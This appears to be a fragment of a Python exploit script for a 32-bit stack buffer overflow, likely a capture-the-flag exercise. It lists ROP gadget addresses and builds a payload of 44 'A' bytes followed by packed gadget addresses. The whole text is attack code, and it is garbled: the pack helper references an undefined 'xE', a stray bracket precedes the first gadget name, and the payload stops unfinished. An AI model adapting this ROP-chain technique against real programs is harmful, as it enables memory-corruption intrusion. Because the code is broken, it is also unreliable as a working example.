
import sys
import os
import struct

def p(x):
    return struct.pack("<L", xE)

]ret = 0x804837e
popret = 0x8048395
pop4ret = 0x80486ec
pop2ret = 0x80486ee
pop3ret = 0x80486ed
addesp_12 = 0x8048392
addesp_44 = 0x80486e9

payload = ""
payload = "A"*44

payload += p(addesp_12)
payload += p(popret)
payload += p(0x080485c4)

payload += "BBBB"
